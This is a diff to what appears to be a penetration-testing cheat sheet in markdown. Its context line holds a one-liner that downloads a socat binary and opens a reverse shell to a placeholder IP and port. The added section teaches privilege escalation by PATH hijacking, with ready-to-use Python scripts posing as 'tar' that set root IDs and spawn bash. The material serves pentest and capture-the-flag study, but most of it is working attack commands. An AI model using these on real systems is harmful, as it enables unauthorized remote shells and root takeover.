@@ -227,3 +227,34 @@ References:
       wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[ip]:[port]
 
 -----------------------
+
+### Privesc with PATH HIJACKING
+
+- If the path to a binary is not specified in a script or binary e.g `tar instead of /usr/bin/tar`, you can set the environmental variable with `export PATH=.:$PATH` to check the current directory for our malcious binary before moving to `/usr/bin` to grab a binary.
+
+- Our Malicious tar file should contain this if python3 is present on the victim machine
+
+      #! /usr/bin/env python3 
+      print("Malicious me")
+      import os
+      os.setuid(0)
+      os.setgid(0)
+      os.system("/bin/bash")
+
+- Python
+      
+      #! /usr/bin/env python
+      print("Malicious me")
+      import os
+      os.setuid(0)
+      os.setgid(0)
+      os.system("/bin/bash")
+
+- Use `chmod +x tar` later
+
+
+### REFERENCES:
+
+- [Nguyen](https://securitynguyen.com/posts/linux-privilege-escalation/path-hijacking-linux-privilege-escalation/)
+
+---------------------------
